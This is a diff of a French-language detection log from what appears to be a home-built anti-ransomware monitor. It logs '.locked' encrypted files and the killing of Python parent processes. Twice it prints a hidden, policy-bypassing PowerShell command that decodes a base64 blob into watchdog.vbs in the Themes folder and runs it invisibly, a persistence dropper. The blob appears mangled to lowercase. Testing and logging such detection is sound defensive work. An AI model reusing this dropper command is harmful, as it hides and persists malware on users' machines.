@@ -1,107 +1,942 @@
-2025-07-24 12:49:56.259Z [🧨] Fichier chiffré détecté : c:\users\mehdi\.bash_history.locked
-2025-07-24 12:49:56.259Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
-2025-07-24 12:49:56.259Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
-2025-07-24 12:49:56.259Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
-2025-07-24 12:49:56.259Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
-2025-07-24 12:49:56.275Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
-2025-07-24 12:49:56.275Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.ini.locked
-2025-07-24 12:49:56.483Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
-2025-07-24 12:49:56.483Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
-2025-07-24 12:49:56.694Z [🧨] Fichier chiffré détecté : c:\users\mehdi\3d objects\desktop.ini.locked
-2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\.bash_history.locked
-2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
-2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
-2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
-2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
-2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
-2025-07-24 13:18:42.798Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.ini.locked
-2025-07-24 13:18:43.012Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
-2025-07-24 13:18:43.012Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
-2025-07-24 13:18:43.219Z [🧨] Fichier chiffré détecté : c:\users\mehdi\3d objects\desktop.ini.locked
-2025-07-24 13:18:44.032Z [🧨] Fichier chiffré détecté : c:\users\mehdi\contacts\desktop.ini.locked
-2025-07-24 13:18:44.032Z [🧨] Fichier chiffré détecté : c:\users\mehdi\desktop\desktop.ini.locked
-2025-07-24 13:18:44.032Z [🧨] Fichier chiffré détecté : c:\users\mehdi\documents\desktop.ini.locked
-2025-07-24 13:18:44.032Z [🧨] Fichier chiffré détecté : c:\users\mehdi\downloads\desktop.ini.locked
-2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\favorites\desktop.ini.locked
-2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\links\desktop.ini.locked
-2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\favorites\links\desktop.ini.locked
-2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\onedrive\desktop.ini.locked
-2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\music\desktop.ini.locked
-2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\pictures\desktop.ini.locked
-2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\pictures\camera roll\desktop.ini.locked
-2025-07-24 13:18:44.240Z [🧨] Fichier chiffré détecté : c:\users\mehdi\pictures\saved pictures\desktop.ini.locked
-2025-07-24 13:18:44.454Z [🧨] Fichier chiffré détecté : c:\users\mehdi\favorites\bing.url.locked
-2025-07-24 13:18:44.454Z [🧨] Fichier chiffré détecté : c:\users\mehdi\links\desktop.lnk.locked
-2025-07-24 13:18:44.454Z [🧨] Fichier chiffré détecté : c:\users\mehdi\links\downloads.lnk.locked
-2025-07-24 13:18:45.068Z [🧨] Fichier chiffré détecté : c:\users\mehdi\saved games\desktop.ini.locked
-2025-07-24 13:18:45.476Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\desktop.ini.locked
-2025-07-24 13:18:45.476Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\winrt--{s-1-5-21-1349940229-2857808021-1114501214-1000}-.searchconnector-ms.locked
-2025-07-24 13:18:45.476Z [🧨] Fichier chiffré détecté : c:\users\mehdi\videos\desktop.ini.locked
-2025-07-24 13:18:45.683Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\everywhere.search-ms.locked
-2025-07-24 13:18:45.683Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\indexed locations.search-ms.locked
-2025-07-24 13:18:45.683Z [🧨] Fichier chiffré détecté : c:\users\public\desktop.ini.locked
-2025-07-24 13:18:45.683Z [🧨] Fichier chiffré détecté : c:\users\mehdi\videos\captures\desktop.ini.locked
-2025-07-24 13:18:45.891Z [🧨] Fichier chiffré détecté : c:\users\public\accountpictures\desktop.ini.locked
-2025-07-24 13:18:45.891Z [🧨] Fichier chiffré détecté : c:\users\public\documents\desktop.ini.locked
-2025-07-24 13:18:46.097Z [🧨] Fichier chiffré détecté : c:\users\public\downloads\desktop.ini.locked
-2025-07-24 13:18:46.097Z [🧨] Fichier chiffré détecté : c:\users\public\libraries\desktop.ini.locked
-2025-07-24 13:18:46.097Z [🧨] Fichier chiffré détecté : c:\users\public\libraries\recordedtv.library-ms.locked
-2025-07-24 13:18:46.097Z [🧨] Fichier chiffré détecté : c:\users\public\music\desktop.ini.locked
-2025-07-24 13:18:46.097Z [🧨] Fichier chiffré détecté : c:\users\public\videos\desktop.ini.locked
-2025-07-24 13:18:46.309Z [🧨] Fichier chiffré détecté : c:\users\public\pictures\desktop.ini.locked
-2025-07-24 13:24:23.747Z [⚠️] Processus suspect détecté : c:\windows\system32\cmd.exe
-2025-07-24 13:24:23.748Z       Ligne de commande : c:\windows\system32\cmd.exe /c "powershell -windowstyle hidden -executionpolicy bypass -noprofile -command "$b64 = 't24grxjyb3igumvzdw1lie5lehqku2v0ifdzafnozwxsid0gq3jlyxrlt2jqzwn0kcjxu2nyaxb0llnozwxsiikku2v0ig9ialdnsvnlcnzpy2ugpsbhzxrpymply3qoindpbm1nbxrzolxcllxyb290xgnpbxyyiikkdgfyz2v0id0gikm6xfxvc2vyc1xcbwvozglcxerlc2t0b3bcxhjhbnnvbxdhcmvcxgvuy29kzxiuchkicndhdgnozg9ntmftzsa9icj3yxrjagrvzy52ynmicgptzxqgy29stwugpsbvympxtultzxj2awnllkv4zwnrdwvyesgiu0vmrunuicogrljptsbxaw4zml9qcm9jzxnzifdirvjfie5hbwu9j3dzy3jpchquzxhljybpuiboyw1lpsdjc2nyaxb0lmv4zscikqpjb3vudca9idakrm9yievhy2ggchjvyybjbibjb2xnzqogicagswygsw5tdhiotenhc2uochjvyy5db21tyw5ktgluzsksiexdyxnlkhdhdgnozg9ntmftzskpid4gmcbuagvuciagicagicagy291bnqgpsbjb3vudcaridekicagievuzcbjzgpozxh0cklmignvdw50id4gmsbuagvuciagicbxu2nyaxb0llf1axqkrw5kielmcgpsyw5kb21pemukv1njcmlwdc5tbgvlccaosw50kcg4mcaqifjuzckgkyaxmckgkiaxmdawkqokrg8kicagigzvdw5kid0grmfsc2ukicagifnldcbjb2xqcm9jzxnztglzdca9ig9ialdnsvnlcnzpy2uurxhly1f1zxj5kcjtruxfq1qgkibguk9nifdpbjmyx1byb2nlc3mgv0hfukugtmftzt0nchl0ag9ulmv4zscgt1igtmftzt0nchl0ag9udy5leguniikkicagiezvcibfywnoig9ialbyb2nlc3mgsw4gy29suhjvy2vzc0xpc3qkicagicagicbjzibjbln0cihmq2fzzshvympqcm9jzxnzlknvbw1hbmrmaw5lkswgtenhc2uoiiaiicygdgfyz2v0icygiiaikskgpiawie9yif8kicagicagicagicbsawdodchmq2fzzshvympqcm9jzxnzlknvbw1hbmrmaw5lkswgtgvukhrhcmdldckpid0gtenhc2uodgfyz2v0ksbuagvuciagicagicagicagigzvdw5kid0gvhj1zqogicagicagicagicbfegl0iezvcgogicagicagievuzcbjzgogicagtmv4daokicagielmie5vdcbmb3vuzcbuagvuciagicagicagv3nou2hlbgwuunvuicjwb3dlcnnozwxsic1xaw5kb3dtdhlszsbiawrkzw4gluv4zwn1dglvblbvbgljesbcexbhc3mglunvbw1hbmqgiijtdgfydc1qcm9jzxnzic1xaw5kb3dtdhlszsbiawrkzw4gluzpbgvqyxroicdwexrob253lmv4zscglufyz3vtzw50tglzdcaniiamihrhcmdldcamiciniiiilcawlcbgywxzzqogicagrw5kielmcgogicagv1njcmlwdc5tbgvlcca1mdawckxvb3ak'; $vbs = [system.text.encoding]::utf8.getstring([system.convert]::frombase64string($b64)); [system.io.file]::writealltext('c:\\users\\mehdi\\appdata\\roaming\\microsoft\\windows\\themes\\watchdog.vbs', $vbs); start-process -windowstyle hidden wscript.exe 'c:\\users\\mehdi\\appdata\\roaming\\microsoft\\windows\\themes\\watchdog.vbs'""
-2025-07-24 13:24:23.751Z [🔪] Kill tree PID=4376
-2025-07-24 13:24:23.754Z [⚠️] Processus suspect détecté : c:\windows\system32\windowspowershell\v1.0\powershell.exe
-2025-07-24 13:24:23.756Z       Ligne de commande : powershell  -windowstyle hidden -executionpolicy bypass -noprofile -command "$b64 = 't24grxjyb3igumvzdw1lie5lehqku2v0ifdzafnozwxsid0gq3jlyxrlt2jqzwn0kcjxu2nyaxb0llnozwxsiikku2v0ig9ialdnsvnlcnzpy2ugpsbhzxrpymply3qoindpbm1nbxrzolxcllxyb290xgnpbxyyiikkdgfyz2v0id0gikm6xfxvc2vyc1xcbwvozglcxerlc2t0b3bcxhjhbnnvbxdhcmvcxgvuy29kzxiuchkicndhdgnozg9ntmftzsa9icj3yxrjagrvzy52ynmicgptzxqgy29stwugpsbvympxtultzxj2awnllkv4zwnrdwvyesgiu0vmrunuicogrljptsbxaw4zml9qcm9jzxnzifdirvjfie5hbwu9j3dzy3jpchquzxhljybpuiboyw1lpsdjc2nyaxb0lmv4zscikqpjb3vudca9idakrm9yievhy2ggchjvyybjbibjb2xnzqogicagswygsw5tdhiotenhc2uochjvyy5db21tyw5ktgluzsksiexdyxnlkhdhdgnozg9ntmftzskpid4gmcbuagvuciagicagicagy291bnqgpsbjb3vudcaridekicagievuzcbjzgpozxh0cklmignvdw50id4gmsbuagvuciagicbxu2nyaxb0llf1axqkrw5kielmcgpsyw5kb21pemukv1njcmlwdc5tbgvlccaosw50kcg4mcaqifjuzckgkyaxmckgkiaxmdawkqokrg8kicagigzvdw5kid0grmfsc2ukicagifnldcbjb2xqcm9jzxnztglzdca9ig9ialdnsvnlcnzpy2uurxhly1f1zxj5kcjtruxfq1qgkibguk9nifdpbjmyx1byb2nlc3mgv0hfukugtmftzt0nchl0ag9ulmv4zscgt1igtmftzt0nchl0ag9udy5leguniikkicagiezvcibfywnoig9ialbyb2nlc3mgsw4gy29suhjvy2vzc0xpc3qkicagicagicbjzibjbln0cihmq2fzzshvympqcm9jzxnzlknvbw1hbmrmaw5lkswgtenhc2uoiiaiicygdgfyz2v0icygiiaikskgpiawie9yif8kicagicagicagicbsawdodchmq2fzzshvympqcm9jzxnzlknvbw1hbmrmaw5lkswgtgvukhrhcmdldckpid0gtenhc2uodgfyz2v0ksbuagvuciagicagicagicagigzvdw5kid0gvhj1zqogicagicagicagicbfegl0iezvcgogicagicagievuzcbjzgogicagtmv4daokicagielmie5vdcbmb3vuzcbuagvuciagicagicagv3nou2hlbgwuunvuicjwb3dlcnnozwxsic1xaw5kb3dtdhlszsbiawrkzw4gluv4zwn1dglvblbvbgljesbcexbhc3mglunvbw1hbmqgiijtdgfydc1qcm9jzxnzic1xaw5kb3dtdhlszsbiawrkzw4gluzpbgvqyxroicdwexrob253lmv4zscglufyz3vtzw50tglzdcaniiamihrhcmdldcamiciniiiilcawlcbgywxzzqogicagrw5kielmcgogicagv1njcmlwdc5tbgvlcca1mdawckxvb3ak'; $vbs = [system.text.encoding]::utf8.getstring([system.convert]::frombase64string($b64)); [system.io.file]::writealltext('c:\\users\\mehdi\\appdata\\roaming\\microsoft\\windows\\themes\\watchdog.vbs', $vbs); start-process -windowstyle hidden wscript.exe 'c:\\users\\mehdi\\appdata\\roaming\\microsoft\\windows\\themes\\watchdog.vbs'"
-2025-07-24 13:24:23.758Z [🔪] Kill tree PID=7904
-2025-07-24 13:24:25.784Z [🧨] Fichier chiffré détecté : c:\users\mehdi\.bash_history.locked
-2025-07-24 13:24:25.786Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
-2025-07-24 13:24:25.789Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
-2025-07-24 13:24:25.790Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
-2025-07-24 13:24:25.792Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
-2025-07-24 13:24:25.793Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
-2025-07-24 13:24:25.796Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.ini.locked
-2025-07-24 13:24:25.998Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
-2025-07-24 13:24:26.001Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
-2025-07-24 13:24:26.206Z [🧨] Fichier chiffré détecté : c:\users\mehdi\3d objects\desktop.ini.locked
-2025-07-24 13:24:27.019Z [🧨] Fichier chiffré détecté : c:\users\mehdi\contacts\desktop.ini.locked
-2025-07-24 13:24:27.021Z [🧨] Fichier chiffré détecté : c:\users\mehdi\desktop\desktop.ini.locked
-2025-07-24 13:24:27.024Z [🧨] Fichier chiffré détecté : c:\users\mehdi\documents\desktop.ini.locked
-2025-07-24 13:24:27.025Z [🧨] Fichier chiffré détecté : c:\users\mehdi\downloads\desktop.ini.locked
-2025-07-24 13:24:27.228Z [🧨] Fichier chiffré détecté : c:\users\mehdi\favorites\desktop.ini.locked
-2025-07-24 13:24:27.230Z [🧨] Fichier chiffré détecté : c:\users\mehdi\links\desktop.ini.locked
-2025-07-24 13:24:27.231Z [🧨] Fichier chiffré détecté : c:\users\mehdi\favorites\links\desktop.ini.locked
-2025-07-24 13:24:27.234Z [🧨] Fichier chiffré détecté : c:\users\mehdi\onedrive\desktop.ini.locked
-2025-07-24 13:24:27.235Z [🧨] Fichier chiffré détecté : c:\users\mehdi\music\desktop.ini.locked
-2025-07-24 13:24:27.236Z [🧨] Fichier chiffré détecté : c:\users\mehdi\pictures\desktop.ini.locked
-2025-07-24 13:24:27.238Z [🧨] Fichier chiffré détecté : c:\users\mehdi\pictures\camera roll\desktop.ini.locked
-2025-07-24 13:24:27.239Z [🧨] Fichier chiffré détecté : c:\users\mehdi\pictures\saved pictures\desktop.ini.locked
-2025-07-24 13:24:27.443Z [🧨] Fichier chiffré détecté : c:\users\mehdi\favorites\bing.url.locked
-2025-07-24 13:24:27.445Z [🧨] Fichier chiffré détecté : c:\users\mehdi\links\desktop.lnk.locked
-2025-07-24 13:24:27.447Z [🧨] Fichier chiffré détecté : c:\users\mehdi\links\downloads.lnk.locked
-2025-07-24 13:24:28.056Z [🧨] Fichier chiffré détecté : c:\users\mehdi\saved games\desktop.ini.locked
-2025-07-24 13:24:28.463Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\desktop.ini.locked
-2025-07-24 13:24:28.466Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\winrt--{s-1-5-21-1349940229-2857808021-1114501214-1000}-.searchconnector-ms.locked
-2025-07-24 13:24:28.468Z [🧨] Fichier chiffré détecté : c:\users\mehdi\videos\desktop.ini.locked
-2025-07-24 13:24:28.672Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\everywhere.search-ms.locked
-2025-07-24 13:24:28.674Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\indexed locations.search-ms.locked
-2025-07-24 13:24:28.675Z [🧨] Fichier chiffré détecté : c:\users\public\desktop.ini.locked
-2025-07-24 13:24:28.677Z [🧨] Fichier chiffré détecté : c:\users\mehdi\videos\captures\desktop.ini.locked
-2025-07-24 13:24:28.879Z [🧨] Fichier chiffré détecté : c:\users\public\accountpictures\desktop.ini.locked
-2025-07-24 13:24:28.881Z [🧨] Fichier chiffré détecté : c:\users\public\documents\desktop.ini.locked
-2025-07-24 13:24:29.086Z [🧨] Fichier chiffré détecté : c:\users\public\downloads\desktop.ini.locked
-2025-07-24 13:24:29.087Z [🧨] Fichier chiffré détecté : c:\users\public\libraries\desktop.ini.locked
-2025-07-24 13:24:29.089Z [🧨] Fichier chiffré détecté : c:\users\public\libraries\recordedtv.library-ms.locked
-2025-07-24 13:24:29.090Z [🧨] Fichier chiffré détecté : c:\users\public\music\desktop.ini.locked
-2025-07-24 13:24:29.091Z [🧨] Fichier chiffré détecté : c:\users\public\videos\desktop.ini.locked
-2025-07-24 13:24:29.294Z [🧨] Fichier chiffré détecté : c:\users\public\pictures\desktop.ini.locked
-2025-07-24 13:28:34.800Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
-2025-07-24 13:28:34.816Z [🔪] Kill parent PID 1212 (python3.11.exe)
-2025-07-24 13:28:34.816Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
-2025-07-24 13:28:34.832Z [🔪] Kill parent PID 1212 (python3.11.exe)
-2025-07-24 13:28:35.066Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
-2025-07-24 13:28:35.082Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
-2025-07-24 13:28:35.301Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
-2025-07-24 13:28:35.316Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
-2025-07-24 13:28:35.332Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
+2025-07-24 22:28:23.611Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (10).bmp.locked
+2025-07-24 22:28:23.676Z [🔪] Kill parent PID 9516 (python3.11.exe)
+2025-07-24 22:28:23.761Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (13).bmp.locked
+2025-07-24 22:28:23.911Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (17).bmp.locked
+2025-07-24 22:28:23.935Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (12).bmp.locked
+2025-07-24 22:28:23.967Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (16).bmp.locked
+2025-07-24 22:28:23.998Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (14).bmp.locked
+2025-07-24 22:28:24.068Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (15).bmp.locked
+2025-07-24 22:28:24.237Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (18).bmp.locked
+2025-07-24 22:28:24.364Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (19).bmp.locked
+2025-07-24 22:28:24.652Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (11).bmp.locked
+2025-07-24 22:28:24.819Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (2).bmp.locked
+2025-07-24 22:28:25.883Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (20).bmp.locked
+2025-07-24 22:28:26.211Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (21).bmp.locked
+2025-07-24 22:28:26.403Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (22).bmp.locked
+2025-07-24 22:28:26.500Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (23).bmp.locked
+2025-07-24 22:39:10.555Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\appdata\roaming\microsoft\windows\themes\watchdog.vbs'
+2025-07-24 22:44:42.280Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\appdata\roaming\microsoft\windows\themes\watchdog.vbs'
+2025-07-24 22:44:42.326Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\appdata\roaming\microsoft\windows\themes\watchdog.vbs'
+2025-07-24 22:44:42.342Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (3).bmp.locked'
+2025-07-24 22:44:42.342Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (3).bmp.locked
+2025-07-24 22:44:42.342Z [DEBUG] ProcessId détecté : 10152
+2025-07-24 22:44:42.342Z [WARN] Processus PID 10152 non trouvé
+2025-07-24 22:44:42.342Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (25).bmp.locked'
+2025-07-24 22:44:42.342Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (25).bmp.locked
+2025-07-24 22:44:42.358Z [DEBUG] ProcessId détecté : 6224
+2025-07-24 22:44:42.358Z [WARN] Processus PID 6224 non trouvé
+2025-07-24 22:44:42.358Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (24).bmp.locked'
+2025-07-24 22:44:42.358Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (24).bmp.locked
+2025-07-24 22:44:42.358Z [DEBUG] ProcessId détecté : 9812
+2025-07-24 22:44:42.358Z [WARN] Processus PID 9812 non trouvé
+2025-07-24 22:44:42.358Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (28).bmp.locked'
+2025-07-24 22:44:42.374Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (28).bmp.locked
+2025-07-24 22:44:42.374Z [DEBUG] ProcessId détecté : 9784
+2025-07-24 22:44:42.374Z [WARN] Processus PID 9784 non trouvé
+2025-07-24 22:44:42.374Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (27).bmp.locked'
+2025-07-24 22:44:42.374Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (27).bmp.locked
+2025-07-24 22:44:42.374Z [DEBUG] ProcessId détecté : 5932
+2025-07-24 22:44:42.374Z [WARN] Processus PID 5932 non trouvé
+2025-07-24 22:44:42.390Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (29).bmp.locked'
+2025-07-24 22:44:42.390Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (29).bmp.locked
+2025-07-24 22:44:42.390Z [DEBUG] ProcessId détecté : 11076
+2025-07-24 22:44:42.390Z [WARN] Processus PID 11076 non trouvé
+2025-07-24 22:44:42.390Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (30).bmp.locked'
+2025-07-24 22:44:42.390Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (30).bmp.locked
+2025-07-24 22:44:42.390Z [DEBUG] ProcessId détecté : 10368
+2025-07-24 22:44:42.390Z [WARN] Processus PID 10368 non trouvé
+2025-07-24 22:44:42.405Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (32).bmp.locked'
+2025-07-24 22:44:42.405Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (32).bmp.locked
+2025-07-24 22:44:42.405Z [DEBUG] ProcessId détecté : 10872
+2025-07-24 22:44:42.405Z [WARN] Processus PID 10872 non trouvé
+2025-07-24 22:44:42.405Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (33).bmp.locked'
+2025-07-24 22:44:42.405Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (33).bmp.locked
+2025-07-24 22:44:42.405Z [DEBUG] ProcessId détecté : 9888
+2025-07-24 22:44:42.405Z [WARN] Processus PID 9888 non trouvé
+2025-07-24 22:44:42.405Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (34).bmp.locked'
+2025-07-24 22:44:42.405Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (34).bmp.locked
+2025-07-24 22:44:42.405Z [DEBUG] ProcessId détecté : 6880
+2025-07-24 22:44:42.420Z [WARN] Processus PID 6880 non trouvé
+2025-07-24 22:44:42.420Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (35).bmp.locked'
+2025-07-24 22:44:42.420Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (35).bmp.locked
+2025-07-24 22:44:42.420Z [DEBUG] ProcessId détecté : 9824
+2025-07-24 22:44:42.420Z [WARN] Processus PID 9824 non trouvé
+2025-07-24 22:44:42.420Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (36).bmp.locked'
+2025-07-24 22:44:42.420Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (36).bmp.locked
+2025-07-24 22:44:42.436Z [DEBUG] ProcessId détecté : 10808
+2025-07-24 22:44:42.436Z [WARN] Processus PID 10808 non trouvé
+2025-07-24 22:44:42.436Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (31).bmp.locked'
+2025-07-24 22:44:42.436Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (31).bmp.locked
+2025-07-24 22:44:42.436Z [DEBUG] ProcessId détecté : 1776
+2025-07-24 22:44:42.436Z [WARN] Processus PID 1776 non trouvé
+2025-07-24 22:44:42.436Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (37).bmp.locked'
+2025-07-24 22:44:42.436Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (37).bmp.locked
+2025-07-24 22:44:42.452Z [DEBUG] ProcessId détecté : 8248
+2025-07-24 22:44:42.452Z [WARN] Processus PID 8248 non trouvé
+2025-07-24 22:44:42.452Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (26).bmp.locked'
+2025-07-24 22:44:42.452Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (26).bmp.locked
+2025-07-24 22:44:42.452Z [DEBUG] ProcessId détecté : 4040
+2025-07-24 22:44:42.452Z [WARN] Processus PID 4040 non trouvé
+2025-07-24 22:44:42.468Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (38).bmp.locked'
+2025-07-24 22:44:42.468Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (38).bmp.locked
+2025-07-24 22:44:42.468Z [DEBUG] ProcessId détecté : 10152
+2025-07-24 22:44:42.468Z [WARN] Processus PID 10152 non trouvé
+2025-07-24 22:44:42.468Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (39).bmp.locked'
+2025-07-24 22:44:42.468Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (39).bmp.locked
+2025-07-24 22:44:42.468Z [DEBUG] ProcessId détecté : 10872
+2025-07-24 22:44:42.468Z [WARN] Processus PID 10872 non trouvé
+2025-07-24 22:44:42.486Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (4).bmp.locked'
+2025-07-24 22:44:42.486Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (4).bmp.locked
